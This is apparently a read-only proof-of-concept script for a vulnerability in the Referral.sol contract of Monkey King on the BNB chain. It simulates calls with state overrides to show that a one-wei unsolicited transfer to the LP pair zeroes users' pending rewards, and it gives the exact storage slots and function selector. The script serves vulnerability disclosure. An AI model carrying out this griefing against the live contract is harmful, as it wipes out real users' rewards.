// PoC: Referral.sol (Monkey King / mking.fun, BNB chain) LP-desync griefing.
//
// READ-ONLY. This sends no transaction and touches no live state: it issues eth_call with a
// state override that injects a synthetic user's accounting and a stub pair token. The
// deployed implementation bytecode is the real thing being executed.
//
// Result: with the recorded LP amount and the live pair balance equal, pendingReward is
// non-zero; shifting the live balance by one wei (an unsolicited transfer) makes it zero.
//
//   node scripts/poc-referral-desync.mjs
const IMPL = '0xd38B1B9CE1BbC7caaA5435c1791b6E6d90fd81c9';
const USER = '0x1111111111111111111111111111111111111111';
const PAIR = '0x0000000000000000000000000000000000001000';
const RPCS = ['https://bsc-dataseed.bnbchain.org', 'https://bsc-mainnet.public.blastapi.io'];

const word = (n) => '0x' + BigInt(n).toString(16).padStart(64, '0');
const pairWord = '0x' + (BigInt(PAIR) << 8n).toString(16).padStart(64, '0');
const data = '0xf40f0f52' + USER.slice(2).padStart(64, '0'); // pendingReward(address)

// Slots from Sourcify storageLayout for Referral (slot 107 pair@offset1, 113 userReward,
// 115 userLpAmount, 116 userPower, 120 accRewardPerShare, 122 lastReleaseDay).
const SLOT = {
  pair: '0x' + '0'.repeat(62) + '6b',
  userPower: '0x923d0ac6cd45db9a6b93b560e49fd23a1d9466a6eeb395f4a2d3c6c64dd28304',
  userLpAmount: '0x31f2e0a88118fbad64c11143f5897ce22bbb2e8a3a681b6e6673346bdbe0cb2b',
  acc2: '0x7272e812bdb6964152d8b7ae2e59ea165135f4af78fa753c88166b7c1ad0d720',
  acc0: '0x081a134e404bb5bca49ef6b8477e647c1205f6d43d6a20bb692a968ac5aa7144',
  lastReleaseDay: '0x' + '0'.repeat(62) + '7a',
};

function stateDiff() {
  return {
    [SLOT.pair]: pairWord,
    [SLOT.userPower]: word(100),
    [SLOT.userLpAmount]: word(100),
    [SLOT.lastReleaseDay]: word(2),
    [SLOT.acc2]: word(10n ** 18n),
    [SLOT.acc0]: word(0),
  };
}

// Runtime that returns `value` for any call: PUSH1 value; PUSH1 0; MSTORE; PUSH1 32; PUSH1 0; RETURN
const balanceStub = (value) => '0x60' + value.toString(16).padStart(2, '0') + '60005260206000f3';

async function pending(rpc, balance) {
  const override = { [IMPL]: { stateDiff: stateDiff() }, [PAIR]: { code: balanceStub(balance) } };
  const res = await fetch(rpc, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'eth_call', params: [{ to: IMPL, data }, 'latest', override] }),
  });
  const json = await res.json();
  if (json.error) throw new Error(`${rpc}: ${json.error.message}`);
  return BigInt(json.result);
}

let ok = true;
for (const rpc of RPCS) {
  const synced = await pending(rpc, 100);
  const desynced = await pending(rpc, 101);
  const pass = synced === 100n && desynced === 0n;
  ok = ok && pass;
  console.log(`${pass ? 'PASS' : 'FAIL'}  ${rpc}`);
  console.log(`  pair.balanceOf = 100 (recorded 100) -> pendingReward = ${synced}`);
  console.log(`  pair.balanceOf = 101 (recorded 100) -> pendingReward = ${desynced}  <-- one-wei desync`);
}
process.exitCode = ok ? 0 : 1;
